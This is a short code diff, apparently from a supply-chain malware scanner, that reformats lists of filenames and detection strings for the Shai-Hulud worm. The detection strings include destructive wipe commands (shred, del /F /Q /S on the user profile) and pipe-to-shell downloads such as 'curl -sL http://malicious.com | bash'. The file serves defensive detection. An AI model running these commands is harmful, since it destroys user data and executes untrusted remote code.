@@ -6,5 +6,13 @@
  * They are stored in plain text for transparency.
  */
 
-export const MALWARE_FILENAMES = ["setup_bun.js","bun_environment.js","shai-hulud.js","worm.js"];
-export const MALWARE_PATTERNS = ["Shai-Hulud","The Second Coming","shred -uvz -n 1","del /F /Q /S \"%USERPROFILE%*\"","irm bun.sh/install.ps1|iex","curl -sL http://malicious.com | bash","node setup_bun.js"];
+export const MALWARE_FILENAMES = ['setup_bun.js', 'bun_environment.js', 'shai-hulud.js', 'worm.js'];
+export const MALWARE_PATTERNS = [
+  'Shai-Hulud',
+  'The Second Coming',
+  'shred -uvz -n 1',
+  'del /F /Q /S "%USERPROFILE%*"',
+  'irm bun.sh/install.ps1|iex',
+  'curl -sL http://malicious.com | bash',
+  'node setup_bun.js',
+];
